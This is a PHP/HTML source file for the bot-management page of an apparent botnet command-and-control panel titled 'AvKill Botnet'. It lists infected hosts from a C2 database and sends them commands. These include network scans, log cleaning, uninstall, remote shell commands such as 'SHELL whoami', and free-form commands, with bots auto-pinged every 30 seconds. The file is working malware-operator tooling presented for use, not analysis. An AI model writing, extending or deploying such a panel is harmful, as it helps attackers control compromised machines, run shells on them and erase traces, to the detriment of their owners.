<?php
session_start();
require_once 'auth.php';
checkAuth();

$db = new SQLite3('../c2_server/c2.db');

// Фильтры
$filter_arch = $_GET['arch'] ?? 'all';
$filter_status = $_GET['status'] ?? 'all';
$filter_os = $_GET['os'] ?? 'all';

// Построение запроса
$query = "SELECT * FROM bots WHERE 1=1";
$params = [];

if($filter_arch != 'all') {
    $query .= " AND arch = :arch";
    $params[':arch'] = $filter_arch;
}

if($filter_status != 'all') {
    $query .= " AND is_active = :status";
    $params[':status'] = ($filter_status == 'active') ? 1 : 0;
}

if($filter_os != 'all') {
    $query .= " AND os LIKE :os";
    $params[':os'] = "%$filter_os%";
}

$query .= " ORDER BY last_seen DESC";

$stmt = $db->prepare($query);
foreach($params as $key => $value) {
    $stmt->bindValue($key, $value);
}

$bots = $stmt->execute();

// Архитектуры для фильтра
$architectures = $db->query("SELECT DISTINCT arch FROM bots WHERE arch != ''");
// ОС для фильтра
$oses = $db->query("SELECT DISTINCT os FROM bots WHERE os != ''");
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bot Management - AvKill Botnet</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>
    <?php include 'header.php'; ?>
    <?php include 'sidebar.php'; ?>
    
    <div class="content">
        <h1 class="neon-text">🤖 Bot Management</h1>
        
        <!-- Фильтры -->
        <div class="card">
            <h2>🔍 Filters</h2>
            <form method="GET" style="display: flex; gap: 15px; flex-wrap: wrap;">
                <div class="form-group">
                    <label>Architecture:</label>
                    <select name="arch" class="form-control">
                        <option value="all">All</option>
                        <?php while($arch = $architectures->fetchArray()): ?>
                        <option value="<?php echo $arch['arch']; ?>" <?php echo $filter_arch == $arch['arch'] ? 'selected' : ''; ?>>
                            <?php echo $arch['arch']; ?>
                        </option>
                        <?php endwhile; ?>
                    </select>
                </div>
                
                <div class="form-group">
                    <label>Status:</label>
                    <select name="status" class="form-control">
                        <option value="all">All</option>
                        <option value="active" <?php echo $filter_status == 'active' ? 'selected' : ''; ?>>Active</option>
                        <option value="inactive" <?php echo $filter_status == 'inactive' ? 'selected' : ''; ?>>Inactive</option>
                    </select>
                </div>
                
                <div class="form-group">
                    <label>OS:</label>
                    <select name="os" class="form-control">
                        <option value="all">All</option>
                        <?php while($os = $oses->fetchArray()): ?>
                        <option value="<?php echo $os['os']; ?>" <?php echo $filter_os == $os['os'] ? 'selected' : ''; ?>>
                            <?php echo $os['os']; ?>
                        </option>
                        <?php endwhile; ?>
                    </select>
                </div>
                
                <div class="form-group" style="align-self: flex-end;">
                    <button type="submit" class="btn">Apply Filters</button>
                    <a href="bots.php" class="btn">Reset</a>
                </div>
            </form>
        </div>
        
        <!-- Массовые действия -->
        <div class="card">
            <h2>⚡ Batch Operations</h2>
            <div style="display: flex; gap: 10px; flex-wrap: wrap;">
                <button class="btn" onclick="sendCommandToSelected('UPDATE')">
                    🔄 Update Selected
                </button>
                <button class="btn" onclick="sendCommandToSelected('SCAN 192.168.1.0/24')">
                    🔍 Scan Network
                </button>
                <button class="btn" onclick="sendCommandToSelected('CLEAN')">
                    🧹 Clean Logs
                </button>
                <button class="btn btn-red" onclick="sendCommandToSelected('UNINSTALL')">
                    ⚠️ Uninstall
                </button>
            </div>
        </div>
        
        <!-- Список ботов -->
        <div class="card">
            <h2>📋 Bot List</h2>
            <div class="table-container">
                <table id="botsTable">
                    <thead>
                        <tr>
                            <th><input type="checkbox" id="selectAll"></th>
                            <th>IP Address</th>
                            <th>Architecture</th>
                            <th>OS</th>
                            <th>Uptime</th>
                            <th>Infected</th>
                            <th>Last Seen</th>
                            <th>Status</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php while($bot = $bots->fetchArray()): ?>
                        <?php
                        $status_class = $bot['is_active'] ? 'active' : 'inactive';
                        $status_text = $bot['is_active'] ? '🟢 Active' : '🔴 Inactive';
                        $uptime_hours = floor($bot['uptime'] / 3600);
                        ?>
                        <tr>
                            <td><input type="checkbox" class="bot-checkbox" value="<?php echo $bot['ip']; ?>"></td>
                            <td>
                                <strong><?php echo htmlspecialchars($bot['ip']); ?></strong>
                                <?php if($bot['is_active']): ?>
                                <span class="ping-indicator" data-ip="<?php echo $bot['ip']; ?>">●</span>
                                <?php endif; ?>
                            </td>
                            <td><span class="badge arch"><?php echo htmlspecialchars($bot['arch']); ?></span></td>
                            <td><?php echo htmlspecialchars($bot['os']); ?></td>
                            <td><?php echo $uptime_hours; ?>h</td>
                            <td><?php echo $bot['infected']; ?></td>
                            <td><?php echo date('Y-m-d H:i', $bot['last_seen']); ?></td>
                            <td><span class="status <?php echo $status_class; ?>"><?php echo $status_text; ?></span></td>
                            <td>
                                <div class="action-buttons">
                                    <button class="btn-small" onclick="sendCommand('<?php echo $bot['ip']; ?>', 'STATUS')">
                                        ℹ️ Info
                                    </button>
                                    <button class="btn-small" onclick="sendCommand('<?php echo $bot['ip']; ?>', 'SHELL whoami')">
                                        💻 Shell
                                    </button>
                                    <button class="btn-small btn-red" onclick="removeBot('<?php echo $bot['ip']; ?>')">
                                        ❌ Remove
                                    </button>
                                </div>
                            </td>
                        </tr>
                        <?php endwhile; ?>
                    </tbody>
                </table>
            </div>
            
            <!-- Пагинация -->
            <div style="margin-top: 20px; display: flex; justify-content: space-between;">
                <div>
                    <button class="btn" onclick="exportBots()">📥 Export CSV</button>
                </div>
                <div>
                    <button class="btn">← Previous</button>
                    <span style="margin: 0 10px;">Page 1 of 5</span>
                    <button class="btn">Next →</button>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Модальное окно для команд -->
    <div id="commandModal" class="modal">
        <div class="modal-content">
            <span class="close">&times;</span>
            <h3>💻 Send Command</h3>
            <div class="form-group">
                <label>Command:</label>
                <input type="text" id="customCommand" class="form-control" placeholder="e.g., SHELL ls -la">
            </div>
            <div class="form-group">
                <label>Target Bots:</label>
                <div id="selectedBotsList"></div>
            </div>
            <button class="btn" onclick="executeCustomCommand()">Execute</button>
            <div id="commandOutput" class="terminal" style="height: 200px; margin-top: 15px;"></div>
        </div>
    </div>
    
    <script>
    // Выбор всех ботов
    document.getElementById('selectAll').addEventListener('change', function() {
        const checkboxes = document.querySelectorAll('.bot-checkbox');
        checkboxes.forEach(cb => cb.checked = this.checked);
    });
    
    // Отправка команды выбранным ботам
    function sendCommandToSelected(command) {
        const selected = [];
        document.querySelectorAll('.bot-checkbox:checked').forEach(cb => {
            selected.push(cb.value);
        });
        
        if(selected.length === 0) {
            alert('Please select at least one bot');
            return;
        }
        
        if(confirm(`Send "${command}" to ${selected.length} bots?`)) {
            fetch('api.php?action=command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    bots: selected,
                    command: command
                })
            })
            .then(response => response.json())
            .then(data => {
                alert(`Command sent to ${data.sent} bots`);
            });
        }
    }
    
    // Отправка команды конкретному боту
    function sendCommand(botIp, command) {
        fetch('api.php?action=command_single', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                bot: botIp,
                command: command
            })
        })
        .then(response => response.json())
        .then(data => {
            alert(`Response from ${botIp}: ${data.response}`);
        });
    }
    
    // Удаление бота
    function removeBot(botIp) {
        if(confirm(`Remove bot ${botIp} from database?`)) {
            fetch(`api.php?action=remove&bot=${encodeURIComponent(botIp)}`)
                .then(response => response.json())
                .then(data => {
                    alert(data.message);
                    location.reload();
                });
        }
    }
    
    // Экспорт в CSV
    function exportBots() {
        window.open('api.php?action=export&format=csv', '_blank');
    }
    
    // Пинг ботов
    function pingBots() {
        document.querySelectorAll('.ping-indicator').forEach(indicator => {
            const ip = indicator.dataset.ip;
            fetch(`api.php?action=ping&ip=${encodeURIComponent(ip)}`)
                .then(response => response.json())
                .then(data => {
                    indicator.style.color = data.online ? '#00ff00' : '#ff0000';
                });
        });
    }
    
    // Авто-пинг каждые 30 секунд
    setInterval(pingBots, 30000);
    
    // Модальное окно
    const modal = document.getElementById('commandModal');
    const span = document.getElementsByClassName('close')[0];
    
    span.onclick = function() {
        modal.style.display = "none";
    }
    
    window.onclick = function(event) {
        if (event.target == modal) {
            modal.style.display = "none";
        }
    }
    
    // Открыть модальное окно для кастомной команды
    function openCommandModal() {
        const selected = [];
        document.querySelectorAll('.bot-checkbox:checked').forEach(cb => {
            selected.push(cb.value);
        });
        
        if(selected.length === 0) {
            alert('Please select bots first');
            return;
        }
        
        document.getElementById('selectedBotsList').innerHTML = 
            selected.map(ip => `<div>${ip}</div>`).join('');
        modal.style.display = "block";
    }
    
    // Выполнить кастомную команду
    function executeCustomCommand() {
        const command = document.getElementById('customCommand').value;
        const selected = [];
        document.querySelectorAll('.bot-checkbox:checked').forEach(cb => {
            selected.push(cb.value);
        });
        
        fetch('api.php?action=command', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                bots: selected,
                command: command
            })
        })
        .then(response => response.json())
        .then(data => {
            document.getElementById('commandOutput').innerHTML = 
                `<div class="terminal-line">${data.output}</div>`;
        });
    }
    
    // Поиск по таблице
    function searchBots() {
        const input = document.getElementById('searchInput');
        const filter = input.value.toUpperCase();
        const table = document.getElementById('botsTable');
        const tr = table.getElementsByTagName('tr');
        
        for (let i = 1; i < tr.length; i++) {
            const td = tr[i].getElementsByTagName('td')[1]; // IP column
            if (td) {
                const txtValue = td.textContent || td.innerText;
                tr[i].style.display = txtValue.toUpperCase().indexOf(filter) > -1 ? '' : 'none';
            }
        }
    }
    </script>
    
    <style>
    .badge {
        display: inline-block;
        padding: 3px 8px;
        border-radius: 12px;
        font-size: 0.85em;
        font-weight: bold;
    }
    
    .badge.arch {
        background: rgba(0, 100, 255, 0.3);
        color: #66aaff;
    }
    
    .status.active {
        color: #00ff00;
    }
    
    .status.inactive {
        color: #ff5555;
    }
    
    .status.running {
        color: #ffff00;
    }
    
    .btn-small {
        padding: 5px 10px;
        font-size: 0.85em;
        margin: 2px;
    }
    
    .action-buttons {
        display: flex;
        gap: 5px;
    }
    
    .ping-indicator {
        display: inline-block;
        width: 10px;
        height: 10px;
        border-radius: 50%;
        margin-left: 5px;
        animation: pulse 1s infinite;
    }
    
    @keyframes pulse {
        0% { opacity: 0.3; }
        50% { opacity: 1; }
        100% { opacity: 0.3; }
    }
    
    .modal {
        display: none;
        position: fixed;
        z-index: 1000;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0,0,0,0.8);
    }
    
    .modal-content {
        background-color: #111;
        margin: 10% auto;
        padding: 20px;
        border: 2px solid #00ff00;
        width: 80%;
        max-width: 600px;
        border-radius: 10px;
    }
    
    .close {
        color: #ff0000;
        float: right;
        font-size: 28px;
        font-weight: bold;
        cursor: pointer;
    }
    
    .close:hover {
        color: #ff5555;
    }
    
    #selectedBotsList {
        background: rgba(0, 0, 0, 0.5);
        border: 1px solid #00ff00;
        padding: 10px;
        max-height: 150px;
        overflow-y: auto;
        margin: 10px 0;
    }
    </style>
</body>
</html>